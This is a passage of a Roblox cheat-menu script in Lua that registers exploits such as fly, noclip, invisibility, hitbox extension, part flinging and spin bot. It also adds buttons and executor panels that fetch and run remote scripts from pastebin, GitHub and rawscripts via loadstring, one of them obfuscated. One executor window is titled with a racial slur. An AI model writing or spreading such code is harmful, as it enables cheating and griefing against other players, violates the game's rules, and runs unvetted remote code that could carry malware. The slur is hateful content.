				math.clamp((Humanoid.JumpPower - 50)/(200-50),0,1), 0,
				1, 0
			)
			fill.BackgroundColor3       = Color3.fromRGB(100,200,100)
			fill.BorderSizePixel        = 0
			fill.ZIndex                 = 52
			fill.Parent                 = track
	
	
			local dragging = false
			local minJ, maxJ = 50, 200
	
			local function update(x)
				local rel = math.clamp((x - track.AbsolutePosition.X)/track.AbsoluteSize.X, 0,1)
				local v = math.floor(minJ + (maxJ-minJ)*rel)
				Humanoid.JumpPower = v
				label.Text = "JumpPower: "..v
				fill.Size = UDim2.new(rel,0,1,0)
			end
	
			track.InputBegan:Connect(function(i)
				if i.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = true
					update(i.Position.X)
				end
			end)
			track.InputEnded:Connect(function(i)
				if i.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = false
				end
			end)
			UserInputService.InputChanged:Connect(function(i)
				if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
					update(i.Position.X)
				end
			end)
		end, "Movement", "Control your jumppower")
	
	
	
		FunctionManager:register("Spin Bot", function()
			spinOn = not spinOn
			if spinOn then
				if not HRP then return NotifyERROR("No HRP!") end
	
	
				lockBP = Instance.new("BodyPosition")
				lockBP.Name = "SpinLockBP"
				lockBP.Position = HRP.Position
				lockBP.MaxForce = Vector3.new(1e6, 1e6, 1e6)
				lockBP.P = 1e5
				lockBP.D = 0
				lockBP.Parent = HRP
	
	
				spinBAV = Instance.new("BodyAngularVelocity")
				spinBAV.Name = "SpinBAV"
				spinBAV.AngularVelocity = Vector3.new(0, 10000, 0) 
				spinBAV.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
				spinBAV.P = 1e5
				spinBAV.Parent = HRP
	
				NotifyERROR("Spin Bot On")
			else
				if spinBAV then
					spinBAV:Destroy()
					spinBAV = nil
				end
				if lockBP then
					lockBP:Destroy()
					lockBP = nil
				end
				NotifyERROR("Spin Bot Off")
			end
		end, "Visual", "Speeeeen")
	
		FunctionManager:register("TP To Mouse", function()
			if hit then
				HRP.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
				warn("Teleported to mouse")
			end
		end, "Movement", "BUGGED")
		FunctionManager:register("Save Position", function()
			savedCFrame = HRP.CFrame
			Notify("Position Saved", "SYSTEM", 3)
		end, "Utility", "Checkpoint")
		FunctionManager:register("Load Position", function()
			if savedCFrame then
				HRP.CFrame = savedCFrame
				Notify("Position Loaded", "SYSTEM", 3)
			else
				NotifyERROR("No Position Saved")
			end
		end, "Utility", "Reload")
	
	
		FunctionManager:register("No‑Clip", function()
			noclipOn = not noclipOn
	
			if noclipOn then
				hoverHeight = HRP.Position.Y
	
				while noclipOn == true do
					task.wait(0.01)
	
					for _, part in ipairs(Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
	
					local pos = HRP.Position
					HRP.CFrame = CFrame.new(pos.X, hoverHeight, pos.Z)
				end
	
				Notify("No‑Clip ON (locked at height)", "SYSTEM", 3)
			else
				for _, part in ipairs(Character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.CanCollide = true
					end
				end
				Notify("No‑Clip OFF", "SYSTEM", 3)
			end
		end, "Movement", "NOCLIP")
	
		FunctionManager:register("DarkDex", function()
			--Maybe works?
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()	
		end, "General", "Take a peek under the hood")
		FunctionManager:register("SimpleSpy", function()
			--also maybe works?
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
		end, "Catch remotes")
		FunctionManager:register("Orbit All Nearby Parts", function()
			local radius = 20
			local height = 3
			local orbitSpeed = 2
	
			local speaker = Players.LocalPlayer
			local character = speaker.Character or speaker.CharacterAdded:Wait()
			local root = character:FindFirstChild("HumanoidRootPart")
			if not root then
				NotifyERROR("No HumanoidRootPart found.")
				return
			end
	
			local origin = root.Position
			local orbitParts = {}
	
			for _, part in ipairs(workspace:GetDescendants()) do
				if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(workspace.Terrain) then
					local isInCharacter = false
	
					for _, player in ipairs(Players:GetPlayers()) do
						local char = player.Character
						if char and part:IsDescendantOf(char) then
							isInCharacter = true
							break
						end
					end
	
	
					if not isInCharacter and (part.Position - origin).Magnitude <= radius then
						if not CollectionService:HasTag(part, "OrbitPart") then
							if part:CanSetNetworkOwnership() then
								part:SetNetworkOwner(speaker)
							else
								warn("Cannot set network owner for part:", part.Name)
							end
							part.CanCollide = false
							CollectionService:AddTag(part, "OrbitPart")
							table.insert(orbitParts, part)
						end
	
					end
				end
			end
	
			if #orbitParts == 0 then
				warn("No parts found for orbit.")
				return
			end
	
			local angleOffset = 2 * math.pi / #orbitParts
	
			for i, part in ipairs(orbitParts) do
				local angle = angleOffset * i
	
				local startPos = root.Position + Vector3.new(
					math.cos(angle) * radius,
					height,
					math.sin(angle) * radius
				)
	
				part.Position = startPos
	
				local bodyGyro = Instance.new("BodyGyro")
				bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
				bodyGyro.P = 1e4
				bodyGyro.CFrame = CFrame.new(part.Position, root.Position)
				bodyGyro.Parent = part
	
				local bodyVel = Instance.new("BodyVelocity")
				bodyVel.MaxForce = Vector3.new(1e5, 1e5, 1e5)
				bodyVel.P = 1e4
				bodyVel.Parent = part
	
				local conn
				conn = RunService.Heartbeat:Connect(function(dt)
					if not root or not root.Parent then
						conn:Disconnect()
						return
					end
	
					angle += orbitSpeed * dt
	
					local orbitCenter = root.Position
					local orbitPoint = orbitCenter + Vector3.new(
						math.cos(angle) * radius,
						height,
						math.sin(angle) * radius
					)
	
					local tangent = Vector3.new(
						-math.sin(angle),
						0,
						math.cos(angle)
					).Unit * orbitSpeed * radius
	
					bodyVel.Velocity = tangent
					bodyGyro.CFrame = CFrame.new(part.Position, orbitCenter)
					part.Position = orbitPoint
				end)
			end
	
			warn("Orbiting", #orbitParts, "parts around you.")
		end, "Fun", "You have to be near the parts for a while for it to work")
	
	
		local function toggleInvisibility()
			if invisRunning then return end
			invisRunning = true
	
			local player = Players.LocalPlayer
			repeat task.wait(0.1) until player.Character
			local originalChar = player.Character
			originalChar.Archivable = true
	
			local invisibleChar = originalChar:Clone()
			invisibleChar.Name   = ""
			invisibleChar.Parent = Lighting
	
			-- clone transparency
			for _, part in ipairs(invisibleChar:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Transparency = (part.Name == "HumanoidRootPart") and 1 or 0.5
				end
			end
	
			-- we’ll need these in nested functions:
			local isInvis = false
			local voidConn, deathConn, steppedConn
	
			-- Respawn helper (puts you back to originalChar)
			local function Respawn()
				invisRunning = false
				if steppedConn then steppedConn:Disconnect() end
				if deathConn   then deathConn:Disconnect()   end
	
				player.Character = originalChar
				originalChar.Parent = workspace
				-- destroy the extra humanoid
				local clonedHum = originalChar:FindFirstChildWhichIsA("Humanoid")
				if clonedHum then clonedHum:Destroy() end
	
				invisibleChar.Parent = nil
			end
	
			-- fix for falling through the void
			local voidY = workspace.FallenPartsDestroyHeight
			steppedConn = RunService.Stepped:Connect(function()
				local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
				if not hrp then return end
				local y = hrp.Position.Y
				if (voidY < 0 and y <= voidY) or (voidY >= 0 and y >= voidY) then
					Respawn()
				end
			end)
	
			-- if cloned character dies
			local clonedHum = invisibleChar:FindFirstChildWhichIsA("Humanoid")
			deathConn = clonedHum.Died:Connect(Respawn)
	
			-- now swap them
			local camCF = workspace.CurrentCamera.CFrame
			local hrpCF = originalChar.HumanoidRootPart.CFrame
	
			originalChar:MoveTo(Vector3.new(0, math.pi*1e6, 0))
			workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
			task.wait(0.2)
			workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	
			invisibleChar.Parent = workspace
			invisibleChar.HumanoidRootPart.CFrame = hrpCF
			player.Character = invisibleChar
	
			-- re‑enable animations
			for _, a in ipairs(player.Character:GetDescendants()) do
				if a.Name == "Animate" and a:IsA("Model") then
					a.Disabled = true; a.Disabled = false
				end
			end
			workspace.CurrentCamera:remove()
			wait(.1)
			repeat wait() until player.Character ~= nil
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
			workspace.CurrentCamera.CameraType = "Custom"
			player.CameraMinZoomDistance = 0.5
			player.CameraMaxZoomDistance = 400
			player.CameraMode = "Classic"
			player.Character.Head.Anchored = false
			player.Character.Animate.Enabled = false
			player.Character.Animate.Enabled = true
			Notify("You are now invisible!", "System", 3)
		end
	
		FunctionManager:register(
			"Invisible",
			toggleInvisibility,
			"Fun",
			"Make your character invisible until you respawn or die"
		)
	
	
		FunctionManager:register("Fly", function()
			if not HRP then
				warn("No HumanoidRootPart found; cannot fly.")
				return
			end
	
			flyingEnabled = not flyingEnabled
	
			if flyingEnabled then
	
				flyBG = Instance.new("BodyGyro")
				flyBG.P = 9e4
				flyBG.MaxTorque = Vector3.new(9e4, 9e4, 9e4)
				flyBG.CFrame = HRP.CFrame
				flyBG.Parent = HRP
	
	
				flyBV = Instance.new("BodyVelocity")
				flyBV.MaxForce = Vector3.new(9e4, 9e4, 9e4)
				flyBV.Velocity = Vector3.new(0, 0, 0)
				flyBV.Parent = HRP
	
				flyConn = RunService.Heartbeat:Connect(function()
					local camCFrame = workspace.CurrentCamera.CFrame
					local dir = Vector3.new()
	
					if UserInputService:IsKeyDown(Enum.KeyCode.W) then
						dir = dir + camCFrame.LookVector
					end
					if UserInputService:IsKeyDown(Enum.KeyCode.S) then
						dir = dir - camCFrame.LookVector
					end
					if UserInputService:IsKeyDown(Enum.KeyCode.A) then
						dir = dir - camCFrame.RightVector
					end
					if UserInputService:IsKeyDown(Enum.KeyCode.D) then
						dir = dir + camCFrame.RightVector
					end
					if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
						dir = dir + Vector3.new(0, 1, 0)
					end
					if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
						dir = dir - Vector3.new(0, 1, 0)
					end
	
					if dir.Magnitude > 0 then
						dir = dir.Unit * 50
					end
					flyBV.Velocity = dir
					flyBG.CFrame = CFrame.new(HRP.Position, HRP.Position + camCFrame.LookVector)
				end)
	
			else
				if flyConn then flyConn:Disconnect() flyConn = nil end
				if flyBG then flyBG:Destroy() flyBG = nil end
				if flyBV then flyBV:Destroy() flyBV = nil end
	
	
			end
		end, "Movement", "Fly around!")
	
		FunctionManager:register("HatHub", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
		end, "Troll", "Credits to original maker!")
		FunctionManager:register("Hitbox Extender", function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/AAPVdev/scripts/refs/heads/main/UI_LimbExtender.lua'))()
		end, "Troll", "Extends hitboxes")
		FunctionManager:register("Part Grab", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Unachored_parts_controller_v2.lua.txt"))()
		end, "Troll", "Much better part grab")
		FunctionManager:register("Hat Script", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Scp-096-Obfuscated/refs/heads/main/obuf"))()
		end, "Troll", "HATS")
	
	
	
		FunctionManager:register("PART ORBIT", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/aZjaAr6F", true))()
		end, "Troll", "Probs better orbit")
	
	
		FunctionManager:register("chat unbanner", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/aDFhvMC4", true))()
		end, "Utility", "Credits to the original maker!")
		FunctionManager:register("Fling GUI", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/VynRhxJV", true))()
		end, "Troll", "Credits to the original maker!")
	
	
	
		--init
		updateGrid()
	end)
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Frame2.TextButton.LocalScript
local function C_f()
local script = G2L["f"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frame2:Destroy()
	end)
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame2.DraggableFrame
local function C_10()
local script = G2L["10"];
	local frame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    frame.Position = UDim2.new(
	        startPos.X.Scale,
	        startPos.X.Offset + delta.X,
	        startPos.Y.Scale,
	        startPos.Y.Offset + delta.Y
	    )
	end
	
	frame.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = frame.Position
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	frame.InputChanged:Connect(function(input)
	    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if dragging and input == dragInput then
	        update(input)
	    end
	end)
	
	
end;
task.spawn(C_10);
-- StarterGui.ScreenGui.Frame1.DraggableFrame
local function C_13()
local script = G2L["13"];
	local frame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    frame.Position = UDim2.new(
	        startPos.X.Scale,
	        startPos.X.Offset + delta.X,
	        startPos.Y.Scale,
	        startPos.Y.Offset + delta.Y
	    )
	end
	
	frame.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = frame.Position
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	frame.InputChanged:Connect(function(input)
	    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if dragging and input == dragInput then
	        update(input)
	    end
	end)
	
	
end;
task.spawn(C_13);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_15()
local script = G2L["15"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local UIS = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local TouchEnabled = UIS.TouchEnabled
	
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "c00lkiddGUI_V1"
		screenGui.ResetOnSpawn = false
		screenGui.Parent = player:WaitForChild("PlayerGui")
	
		local mainFrame = Instance.new("Frame")
		mainFrame.Size = UDim2.new(0, 500, 0, 350)
		mainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
		mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		mainFrame.BorderSizePixel = 0
		mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		mainFrame.ClipsDescendants = true
		mainFrame.Parent = screenGui
	
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 10)
		uiCorner.Parent = mainFrame
	
		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(0, 200, 0, 30)
		titleLabel.Position = UDim2.new(0, 10, 0, 10)
		titleLabel.BackgroundTransparency = 1
		titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
		titleLabel.TextScaled = true
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.Text = "c00lkiddGUI V1"
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Parent = mainFrame
	
		local dragging = false
		local dragInput, dragStart, startPos
	
		local function update(input)
			local delta = input.Position - dragStart
			mainFrame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	
		mainFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or (TouchEnabled and input.UserInputType == Enum.UserInputType.Touch) then
				dragging = true
				dragStart = input.Position
				startPos = mainFrame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
	
		mainFrame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or (TouchEnabled and input.UserInputType == Enum.UserInputType.Touch) then
				dragInput = input
			end
		end)
	
		UIS.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	
		local tabNames = {"Hub","Executor","Credits","Logs"}
		local tabs = {}
		local buttonWidth = 120
	
		for i, name in ipairs(tabNames) do
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(0, buttonWidth, 0, 30)
			btn.Position = UDim2.new(0, 10 + (i-1)*(buttonWidth + 5), 0, 50)
			btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.Font = Enum.Font.GothamBold
			btn.Text = name
			btn.Parent = mainFrame
	
			tabs[name] = Instance.new("Frame")
			tabs[name].Size = UDim2.new(1, -20, 1, -90)
			tabs[name].Position = UDim2.new(0, 10, 0, 90)
			tabs[name].BackgroundColor3 = Color3.fromRGB(15,15,15)
			tabs[name].Visible = false
			tabs[name].Parent = mainFrame
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0,10)
			corner.Parent = tabs[name]
	
			btn.MouseButton1Click:Connect(function()
				for _, f in pairs(tabs) do f.Visible = false end
				tabs[name].Visible = true
			end)
		end
	
		local hub = tabs["Hub"]
	
		local hubScroll = Instance.new("ScrollingFrame")
		hubScroll.Size = UDim2.new(1, -10, 1, -10)
		hubScroll.Position = UDim2.new(0, 5, 0, 5)
		hubScroll.BackgroundTransparency = 1
		hubScroll.ScrollBarThickness = 8
		hubScroll.CanvasSize = UDim2.new(0,0,0,0)
		hubScroll.Parent = hub
	
		local hubLayout = Instance.new("UIListLayout")
		hubLayout.Padding = UDim.new(0, 10)
		hubLayout.SortOrder = Enum.SortOrder.LayoutOrder
		hubLayout.Parent = hubScroll
	
		local hubScripts = {
			{"c00lkidd utg", "https://pastebin.com/raw/iwMzX8XG"},
			{"Goner", "https://rawscripts.net/raw/Universal-Script-Goner-47954"},
			{"UTG client replication", "https://rawscripts.net/raw/Client-Replication-UTG-for-client-replication-38612"},
			{"Xester V1", "https://rawscripts.net/raw/Prison-Life-Xester-18937"},
			{"Skybox + decal [Working]", "https://pastebin.com/raw/nDR4H6nx"},
			{"Caducus Require", "https://pastebin.com/raw/XJeBNe0s"}
		}
	
		for _, v in ipairs(hubScripts) do
			local button = Instance.new("TextButton")
			button.Size = UDim2.new(0.95,0,0,30)
			button.BackgroundColor3 = Color3.fromRGB(50,0,0)
			button.TextColor3 = Color3.fromRGB(255,255,255)
			button.Font = Enum.Font.GothamBold
			button.Text = v[1]
			button.Parent = hubScroll
	
			button.MouseButton1Click:Connect(function()
				local success, err = pcall(function()
					loadstring(game:HttpGet(v[2]))()
				end)
				if not success then warn(err) end
			end)
		end
	
		local extraButton = Instance.new("TextButton")
		extraButton.Size = UDim2.new(0.95,0,0,30)
		extraButton.BackgroundColor3 = Color3.fromRGB(50,0,0)
		extraButton.TextColor3 = Color3.fromRGB(255,255,255)
		extraButton.Font = Enum.Font.GothamBold
		extraButton.Text = "Skybox + decal [Not working]"
		extraButton.Parent = hubScroll
	
		extraButton.MouseButton1Click:Connect(function()
			local success, err = pcall(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/C0olSkyDecal"))()
			end)
			if not success then warn(err) end
		end)
	
		hubLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			hubScroll.CanvasSize = UDim2.new(0,0,0,hubLayout.AbsoluteContentSize.Y + 10)
		end)
	
		local executor = tabs["Executor"]
	
		local codeBox = Instance.new("TextBox")
		codeBox.Size = UDim2.new(0.9,0,0.6,0)
		codeBox.Position = UDim2.new(0.05,0,0.05,0)
		codeBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
		codeBox.TextColor3 = Color3.fromRGB(255,255,255)
		codeBox.ClearTextOnFocus = false
		codeBox.TextWrapped = true
		codeBox.MultiLine = true
		codeBox.PlaceholderText = "Paste your Lua code or loadstring here"
		codeBox.Parent = executor
	
		local execButton = Instance.new("TextButton")
		execButton.Size = UDim2.new(0.27,0,0.1,0)
		execButton.Position = UDim2.new(0.05,0,0.7,0)
		execButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
		execButton.TextColor3 = Color3.fromRGB(255,255,255)
		execButton.Text = "Execute"
		execButton.Parent = executor
		execButton.MouseButton1Click:Connect(function()
			local code = codeBox.Text
			local success, err = pcall(function() loadstring(code)() end)
			if not success then warn(err) end
		end)
	
		local clearButton = Instance.new("TextButton")
		clearButton.Size = UDim2.new(0.27,0,0.1,0)
		clearButton.Position = UDim2.new(0.37,0,0.7,0)
		clearButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
		clearButton.TextColor3 = Color3.fromRGB(255,255,255)
		clearButton.Text = "Clear"
		clearButton.Parent = executor
		clearButton.MouseButton1Click:Connect(function() codeBox.Text = "" end)
	
		local ssButton = Instance.new("TextButton")
		ssButton.Size = UDim2.new(0.27,0,0.1,0)
		ssButton.Position = UDim2.new(0.69,0,0.7,0)
		ssButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
		ssButton.TextColor3 = Color3.fromRGB(255,255,255)
		ssButton.Text = "SS Execute"
		ssButton.Parent = executor
		ssButton.MouseButton1Click:Connect(function()
			local assetId = tonumber(codeBox.Text)
			if assetId then
				local success, gui = pcall(function()
					return game:GetService("InsertService"):LoadAsset(assetId)
				end)
				if success and gui then
					for _, obj in pairs(gui:GetChildren()) do
						if obj:IsA("ScreenGui") then
							obj.Parent = player:WaitForChild("PlayerGui")
						end
					end
				else
					warn("Failed to load asset GUI")
				end
			else
				warn("Invalid Asset ID")
			end
		end)
	
		local credits = tabs["Credits"]
		local creditsLabel = Instance.new("TextLabel")
		creditsLabel.Size = UDim2.new(0.9,0,0.2,0)
		creditsLabel.Position = UDim2.new(0.05,0,0.4,0)
		creditsLabel.BackgroundTransparency = 1
		creditsLabel.TextColor3 = Color3.fromRGB(255,50,50)
		creditsLabel.TextScaled = true
		creditsLabel.Font = Enum.Font.GothamBold
		creditsLabel.Text = "GUI by c00lkiddiskingnow!!!"
		creditsLabel.TextWrapped = true
		creditsLabel.Parent = credits
	
		local logs = tabs["Logs"]
		local logBox = Instance.new("ScrollingFrame")
		logBox.Size = UDim2.new(0.95,0,0.9,0)
		logBox.Position = UDim2.new(0.025,0,0.05,0)
		logBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
		logBox.CanvasSize = UDim2.new(0,0,2,0)
		logBox.ScrollBarThickness = 8
		logBox.Parent = logs
	
		local uiList = Instance.new("UIListLayout")
		uiList.SortOrder = Enum.SortOrder.LayoutOrder
		uiList.Parent = logBox
	
		local function addLog(msg)
			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1,0,0,20)
			label.BackgroundTransparency = 1
			label.TextColor3 = Color3.fromRGB(255,255,255)
			label.Font = Enum.Font.SourceSans
			label.TextSize = 16
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Text = msg
			label.Parent = logBox
			logBox.CanvasSize = UDim2.new(0,0,0,uiList.AbsoluteContentSize.Y)
		end
	
		game.Players.PlayerAdded:Connect(function(p)
			addLog("Player joined: "..p.Name)
		end)
	
		game.Players.PlayerRemoving:Connect(function(p)
			addLog("Player left: "..p.Name)
		end)
	
		game:GetService("ReplicatedStorage").ChildAdded:Connect(function(c)
			addLog("ReplicatedStorage added: "..c.Name)
		end)
	
		player.Chatted:Connect(function(msg)
			addLog(player.Name..": "..msg)
		end)
	end)
end;
task.spawn(C_15);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_16()
local script = G2L["16"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_16);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_18()
local script = G2L["18"];
	script.Parent.MouseButton1Click:Connect(function()
		-- Modern Executer GUI Script
		-- This script creates a draggable GUI named "Modern Executer" compatible with Xeno Executor
	
		-- Create ScreenGui
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "niggers executer"
		screenGui.ResetOnSpawn = false
		screenGui.Parent = game:GetService("CoreGui") -- CoreGui to ensure executor compatibility
	
		-- Create main frame
		local mainFrame = Instance.new("Frame")
		mainFrame.Name = "MainFrame"
		mainFrame.Size = UDim2.new(0, 400, 0, 250)
		mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
		mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		mainFrame.BorderSizePixel = 0
		mainFrame.Parent = screenGui
	
		-- Create title bar
		local titleBar = Instance.new("Frame")
		titleBar.Name = "TitleBar"
		titleBar.Size = UDim2.new(1, 0, 0, 30)
		titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
		titleBar.Parent = mainFrame
	
		-- Title text
		local titleLabel = Instance.new("TextLabel")
		titleLabel.Name = "TitleLabel"
		titleLabel.Size = UDim2.new(1, -10, 1, 0)
		titleLabel.Position = UDim2.new(0, 10, 0, 0)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = "Niggers Executer"
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.TextSize = 18
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Parent = titleBar
	
		-- Close button
		local closeButton = Instance.new("TextButton")
		closeButton.Name = "CloseButton"
		closeButton.Size = UDim2.new(0, 30, 1, 0)
		closeButton.Position = UDim2.new(1, -30, 0, 0)
		closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		closeButton.Text = "X"
		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeButton.Font = Enum.Font.GothamBold
		closeButton.TextSize = 18
		closeButton.Parent = titleBar
	
		closeButton.MouseButton1Click:Connect(function()
			screenGui:Destroy()
		end)
	
		-- TextBox for script input
		local scriptBox = Instance.new("TextBox")
		scriptBox.Name = "ScriptBox"
		scriptBox.Size = UDim2.new(1, -20, 1, -70)
		scriptBox.Position = UDim2.new(0, 10, 0, 40)
		scriptBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		scriptBox.Font = Enum.Font.Code
		scriptBox.TextSize = 14
		scriptBox.ClearTextOnFocus = false
		scriptBox.MultiLine = true
		scriptBox.TextWrapped = true
		scriptBox.Parent = mainFrame
	
		-- Execute button
		local executeButton = Instance.new("TextButton")
		executeButton.Name = "ExecuteButton"
		executeButton.Size = UDim2.new(0, 100, 0, 25)
		executeButton.Position = UDim2.new(1, -110, 1, -30)
		executeButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
		executeButton.Text = "Execute"
		executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		executeButton.Font = Enum.Font.GothamBold
		executeButton.TextSize = 16
		executeButton.Parent = mainFrame
	
		-- Draggable functionality
		local UserInputService = game:GetService("UserInputService")
	
		local dragging
		local dragInput
		local dragStart
		local startPos
	
		local function update(input)
			local delta = input.Position - dragStart
			mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	
		titleBar.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = true
				dragStart = input.Position
				startPos = mainFrame.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
	
		titleBar.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement then
				dragInput = input
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if dragging and input == dragInput then
				update(input)
			end
		end)
	
		-- Execute script with Xeno Executor compatibility
		executeButton.MouseButton1Click:Connect(function()
			local scriptText = scriptBox.Text
			if syn and syn.request then
				-- Synapse compatibility (Xeno is Synapse-based)
				local func, err = loadstring(scriptText)
				if func then
					coroutine.wrap(func)()
				else
					warn("Script error: "..err)
				end
			else
				-- Fallback for other environments
				local func, err = loadstring(scriptText)
				if func then
					coroutine.wrap(func)()
				else
					warn("Script error: "..err)
				end
			end
		end)
	end)
end;
task.spawn(C_18);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_19()
local script = G2L["19"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_19);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_1b()
local script = G2L["1b"];
	script.Parent.MouseButton1Click:Connect(function()
		--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		-- Gui to Lua
		-- Version: 3.2
	
		-- Instances:
	
		local ScreenGui = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local Name = Instance.new("TextLabel")
		local Credits = Instance.new("TextLabel")
		local ball = Instance.new("TextButton")
		local noclip = Instance.new("TextButton")
		local fakelag = Instance.new("TextButton")
		local plane = Instance.new("TextButton")
